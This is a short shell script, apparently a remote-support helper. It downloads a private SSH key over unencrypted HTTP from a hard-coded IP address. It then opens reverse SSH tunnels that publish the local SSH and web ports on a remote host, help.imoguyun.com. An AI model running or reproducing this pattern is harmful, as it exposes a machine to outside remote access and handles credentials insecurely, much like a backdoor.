#!/bin/sh

if [ "$#" != "2" ] ; then
    echo "usage $0 : ssh_port web_port"
    exit 1
fi

ssh_port=$1
web_port=$2

wget http://106.186.121.34:8021/file/id_rsa_op
ssh -i id_rsa_op -y -g -N -f -R *:$ssh_port:127.0.0.1:22 -R *:$web_port:127.0.0.1:80 help@help.imoguyun.com